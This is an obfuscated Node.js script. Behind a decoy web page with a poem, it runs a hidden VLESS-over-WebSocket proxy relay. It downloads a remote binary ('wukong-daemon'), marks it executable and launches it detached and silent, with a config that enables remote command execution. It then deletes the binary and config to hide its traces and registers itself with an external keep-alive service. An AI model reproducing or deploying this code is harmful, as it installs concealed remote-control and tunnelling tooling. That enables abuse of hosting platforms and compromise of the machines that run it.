function _0x59e9(_0xead64c,_0x2a75ff){const _0x43869e=_0x4386();return _0x59e9=function(_0x59e97d,_0x5847f9){_0x59e97d=_0x59e97d-0x6e;let _0x848357=_0x43869e[_0x59e97d];return _0x848357;},_0x59e9(_0xead64c,_0x2a75ff);}const _0x4125bf=_0x59e9;(function(_0x6d685,_0x1a28f9){const _0x4ed3f6=_0x59e9,_0x58ee47=_0x6d685();while(!![]){try{const _0x48421a=parseInt(_0x4ed3f6(0x8c))/0x1+parseInt(_0x4ed3f6(0xc6))/0x2*(-parseInt(_0x4ed3f6(0xcb))/0x3)+-parseInt(_0x4ed3f6(0xa1))/0x4*(parseInt(_0x4ed3f6(0x94))/0x5)+parseInt(_0x4ed3f6(0x95))/0x6+-parseInt(_0x4ed3f6(0x9e))/0x7+-parseInt(_0x4ed3f6(0xc7))/0x8+parseInt(_0x4ed3f6(0x7b))/0x9;if(_0x48421a===_0x1a28f9)break;else _0x58ee47['push'](_0x58ee47['shift']());}catch(_0x238c4f){_0x58ee47['push'](_0x58ee47['shift']());}}}(_0x4386,0xd8e10));const os=require('os'),http=require(_0x4125bf(0xb7)),fs=require('fs'),axios=require(_0x4125bf(0xc5)),net=require(_0x4125bf(0x80)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x4125bf(0xbc)),{WebSocket,createWebSocketStream}=require('ws'),KEY=process['env'][_0x4125bf(0x77)]||_0x4125bf(0x75),WUKONG_SERVER=process[_0x4125bf(0x92)][_0x4125bf(0x82)]||'',WUKONG_PORT=process['env'][_0x4125bf(0xb8)]||'',WUKONG_KEY=process[_0x4125bf(0x92)][_0x4125bf(0x90)]||'',DOMAIN=process['env']['DOMAIN']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process['env'][_0x4125bf(0x79)]||KEY[_0x4125bf(0x98)](0x0,0x8),SUB_PATH=process[_0x4125bf(0x92)][_0x4125bf(0x88)]||_0x4125bf(0xad),NAME=process['env'][_0x4125bf(0x85)]||'Vl',PORT=process[_0x4125bf(0x92)][_0x4125bf(0x93)]||0xbb8;function _0x4386(){const _0x18c159=['url','log','https://arm64.ssss.nyc.mn/agent','chmod\x20+x\x20wukong-daemon','12399072qCBexI','from','https://','81992VpssHR','https://amd64.ssss.nyc.mn/v1','utf-8','application/json','reduce','end','https://amd64.ssss.nyc.mn/agent','map','setsid\x20nohup\x20./wukong-daemon\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','wukong-daemon','substr','text/plain','sub123','false','pipe','2083','arm','listen','&path=%2F','connection','wukong-daemon\x20is\x20running','every','http','WUKONG_PORT','config.yaml','join','once','child_process','writeFileSync','data','vless://','client_secret:\x20','WUKONG\x20variable\x20is\x20empty,\x20skip\x20running','get','country','createServer','axios','54584UZLYHZ','9686648WzqrtG','https://oooo.serv00.net/add-url','finish','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','150WNAFLV','asOrganization','toString','arch','connect','error','@www.visa.com.tw:443?encryption=none&security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','replace','send','wukong-daemon\x20is\x20already\x20running,\x20skip\x20running...','Server\x20is\x20running\x20on\x20port\x20','161fc0b2-cfa3-4053-8d51-20aeee66c2dd','--tls','KEY','createWriteStream','WSPATH','8443','23653539OEouLL','writeHead','stream','base64','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','net','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','WUKONG_SERVER','text/html;\x20charset=utf-8','Automatic\x20Access\x20Task\x20added\x20successfully','NAME','decode','split','SUB_PATH','pop','readUInt8','https://arm64.ssss.nyc.mn/v1','1365052RykHxr','wukong-daemon\x20running\x20error:','/bin/bash','write','WUKONG_KEY','aarch64','env','PORT','15SODEyP','7820004xoQJCS','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./wukong-daemon\x22','includes','slice','readUInt16BE'];_0x4386=function(){return _0x18c159;};return _0x4386();}let ISP='';const GetISP=async()=>{const _0x57eac2=_0x4125bf;try{const _0x17cc69=await axios[_0x57eac2(0xc2)]('https://speed.cloudflare.com/meta'),_0x394198=_0x17cc69[_0x57eac2(0xbe)];ISP=(_0x394198[_0x57eac2(0xc3)]+'-'+_0x394198[_0x57eac2(0xcc)])[_0x57eac2(0x71)](/ /g,'_');}catch(_0x13a8c8){ISP='Unknown';}};GetISP();const httpServer=http[_0x4125bf(0xc4)]((_0x43e324,_0x213301)=>{const _0x4f9160=_0x4125bf;if(_0x43e324['url']==='/'){const _0x2c879d='\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<title>An\x20Echo\x20of\x20Light</title>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x20font-family:\x20serif;\x20background-color:\x20#282c34;\x20color:\x20#f0f2f5;\x20display:\x20flex;\x20justify-content:\x20center;\x20align-items:\x20center;\x20height:\x20100vh;\x20margin:\x200;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20pre\x20{\x20font-size:\x201.2em;\x20line-height:\x201.8;\x20white-space:\x20pre-wrap;\x20padding:\x202.5em;\x20background:\x20rgba(255,\x20255,\x20255,\x200.05);\x20border-radius:\x2010px;\x20border:\x201px\x20solid\x20rgba(255,\x20255,\x20255,\x200.1);\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<pre>\x0aThe\x20stars\x20you\x20see,\x20a\x20distant\x20fire,\x0aA\x20whispered\x20echo\x20of\x20desire.\x0a\x0aTheir\x20ancient\x20light,\x20a\x20path\x20it\x20weaves,\x0aThrough\x20silent,\x20dark,\x20and\x20timeless\x20eaves.\x0a\x0aSo\x20look\x20within,\x20and\x20you\x20will\x20find,\x0aA\x20universe\x20inside\x20your\x20mind.\x0a\x20\x20\x20\x20</pre>\x0a</body>\x0a</html>\x0a\x20\x20';_0x213301['writeHead'](0xc8,{'Content-Type':_0x4f9160(0x83)}),_0x213301[_0x4f9160(0xa6)](_0x2c879d);}else{if(_0x43e324[_0x4f9160(0x9a)]==='/'+SUB_PATH){const _0x7f41c0=_0x4f9160(0xbf)+KEY+_0x4f9160(0x6e)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4f9160(0xb3)+WSPATH+'#'+NAME+'-'+ISP,_0x58f5a4=Buffer[_0x4f9160(0x9f)](_0x7f41c0)[_0x4f9160(0xcd)](_0x4f9160(0x7e));_0x213301[_0x4f9160(0x7c)](0xc8,{'Content-Type':'text/plain'}),_0x213301[_0x4f9160(0xa6)](_0x58f5a4+'\x0a');}else _0x213301[_0x4f9160(0x7c)](0x194,{'Content-Type':_0x4f9160(0xac)}),_0x213301[_0x4f9160(0xa6)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=KEY['replace'](/-/g,'');wss['on'](_0x4125bf(0xb4),_0xd14981=>{const _0x5f2912=_0x4125bf;_0xd14981[_0x5f2912(0xbb)]('message',_0x45ea37=>{const _0x1e962d=_0x5f2912,[_0x491ebc]=_0x45ea37,_0xaa9e3e=_0x45ea37['slice'](0x1,0x11);if(!_0xaa9e3e[_0x1e962d(0xb6)]((_0x2075d2,_0x23d52b)=>_0x2075d2==parseInt(uuid[_0x1e962d(0xab)](_0x23d52b*0x2,0x2),0x10)))return;let _0x57f12c=_0x45ea37['slice'](0x11,0x12)[_0x1e962d(0x8a)]()+0x13;const _0x15f509=_0x45ea37[_0x1e962d(0x98)](_0x57f12c,_0x57f12c+=0x2)[_0x1e962d(0x99)](0x0),_0x4a5a7b=_0x45ea37['slice'](_0x57f12c,_0x57f12c+=0x1)[_0x1e962d(0x8a)](),_0x2469f6=_0x4a5a7b==0x1?_0x45ea37['slice'](_0x57f12c,_0x57f12c+=0x4)[_0x1e962d(0xba)]('.'):_0x4a5a7b==0x2?new TextDecoder()[_0x1e962d(0x86)](_0x45ea37[_0x1e962d(0x98)](_0x57f12c+0x1,_0x57f12c+=0x1+_0x45ea37['slice'](_0x57f12c,_0x57f12c+0x1)[_0x1e962d(0x8a)]())):_0x4a5a7b==0x3?_0x45ea37[_0x1e962d(0x98)](_0x57f12c,_0x57f12c+=0x10)[_0x1e962d(0xa5)]((_0x431f54,_0x2bbcda,_0x205fdd,_0x2fabc1)=>_0x205fdd%0x2?_0x431f54['concat'](_0x2fabc1['slice'](_0x205fdd-0x1,_0x205fdd+0x1)):_0x431f54,[])[_0x1e962d(0xa8)](_0x2a24bf=>_0x2a24bf[_0x1e962d(0x99)](0x0)[_0x1e962d(0xcd)](0x10))['join'](':'):'';_0xd14981[_0x1e962d(0x72)](new Uint8Array([_0x491ebc,0x0]));const _0x51c988=createWebSocketStream(_0xd14981);net[_0x1e962d(0xcf)]({'host':_0x2469f6,'port':_0x15f509},function(){const _0x157573=_0x1e962d;this[_0x157573(0x8f)](_0x45ea37[_0x157573(0x98)](_0x57f12c)),_0x51c988['on']('error',()=>{})[_0x157573(0xaf)](this)['on'](_0x157573(0xd0),()=>{})[_0x157573(0xaf)](_0x51c988);})['on'](_0x1e962d(0xd0),()=>{});})['on'](_0x5f2912(0xd0),()=>{});});const getDownloadUrl=()=>{const _0x308996=_0x4125bf,_0xb9387e=os[_0x308996(0xce)]();return _0xb9387e===_0x308996(0xb1)||_0xb9387e==='arm64'||_0xb9387e===_0x308996(0x91)?!WUKONG_PORT?_0x308996(0x8b):_0x308996(0x9c):!WUKONG_PORT?_0x308996(0xa2):_0x308996(0xa7);},downloadFile=async()=>{const _0x28fe1d=_0x4125bf;if(!WUKONG_SERVER&&!WUKONG_KEY)return;try{const _0x15fa1f=getDownloadUrl(),_0x34782e=await axios({'method':_0x28fe1d(0xc2),'url':_0x15fa1f,'responseType':_0x28fe1d(0x7d)}),_0x1f5937=fs[_0x28fe1d(0x78)](_0x28fe1d(0xaa));return _0x34782e[_0x28fe1d(0xbe)][_0x28fe1d(0xaf)](_0x1f5937),new Promise((_0xce08c9,_0x4dbf41)=>{const _0x35afab=_0x28fe1d;_0x1f5937['on'](_0x35afab(0xc9),()=>{const _0x4432cf=_0x35afab;console[_0x4432cf(0x9b)]('wukong-daemon\x20download\x20successfully'),exec(_0x4432cf(0x9d),_0x3b04c0=>{if(_0x3b04c0)_0x4dbf41(_0x3b04c0);_0xce08c9();});}),_0x1f5937['on']('error',_0x4dbf41);});}catch(_0x9dcfb7){throw _0x9dcfb7;}},runnz=async()=>{const _0xe9a2d6=_0x4125bf;try{const _0x5d86b9=execSync(_0xe9a2d6(0x96),{'encoding':_0xe9a2d6(0xa3)});if(_0x5d86b9['trim']()!==''){console[_0xe9a2d6(0x9b)](_0xe9a2d6(0x73));return;}}catch(_0x1c2a02){}await downloadFile();let _0x5a4a5b='',_0x18d304=['443',_0xe9a2d6(0x7a),'2096',_0xe9a2d6(0x70),_0xe9a2d6(0xb0),'2053'];if(WUKONG_SERVER&&WUKONG_PORT&&WUKONG_KEY){const _0x136984=_0x18d304[_0xe9a2d6(0x97)](WUKONG_PORT)?_0xe9a2d6(0x76):'';_0x5a4a5b='setsid\x20nohup\x20./wukong-daemon\x20-s\x20'+WUKONG_SERVER+':'+WUKONG_PORT+'\x20-p\x20'+WUKONG_KEY+'\x20'+_0x136984+_0xe9a2d6(0x81);}else{if(WUKONG_SERVER&&WUKONG_KEY){if(!WUKONG_PORT){const _0x21af6f=WUKONG_SERVER[_0xe9a2d6(0x97)](':')?WUKONG_SERVER[_0xe9a2d6(0x87)](':')[_0xe9a2d6(0x89)]():'',_0xd639d=_0x18d304[_0xe9a2d6(0x97)](_0x21af6f)?'true':_0xe9a2d6(0xae),_0x5a7488=_0xe9a2d6(0xc0)+WUKONG_KEY+_0xe9a2d6(0xca)+WUKONG_SERVER+_0xe9a2d6(0x7f)+_0xd639d+_0xe9a2d6(0x6f)+KEY;fs[_0xe9a2d6(0xbd)]('config.yaml',_0x5a7488);}_0x5a4a5b=_0xe9a2d6(0xa9);}else{console['log'](_0xe9a2d6(0xc1));return;}}try{exec(_0x5a4a5b,{'shell':_0xe9a2d6(0x8e)},_0x785e0a=>{const _0xd0f254=_0xe9a2d6;if(_0x785e0a)console[_0xd0f254(0xd0)](_0xd0f254(0x8d),_0x785e0a);else console[_0xd0f254(0x9b)](_0xd0f254(0xb5));});}catch(_0x434161){console[_0xe9a2d6(0xd0)]('error:\x20'+_0x434161);}};async function addAccessTask(){const _0x3fa0fa=_0x4125bf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xb56868=_0x3fa0fa(0xa0)+DOMAIN+'/'+SUB_PATH;try{const _0x3d2d8a=await axios['post'](_0x3fa0fa(0xc8),{'url':_0xb56868},{'headers':{'Content-Type':_0x3fa0fa(0xa4)}});console[_0x3fa0fa(0x9b)](_0x3fa0fa(0x84));}catch(_0x756db7){}}const delFiles=()=>{const _0x42a61d=_0x4125bf;fs['unlink'](_0x42a61d(0xaa),()=>{}),fs['unlink'](_0x42a61d(0xb9),()=>{});};httpServer[_0x4125bf(0xb2)](PORT,()=>{const _0x169705=_0x4125bf;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x169705(0x74)+PORT);});
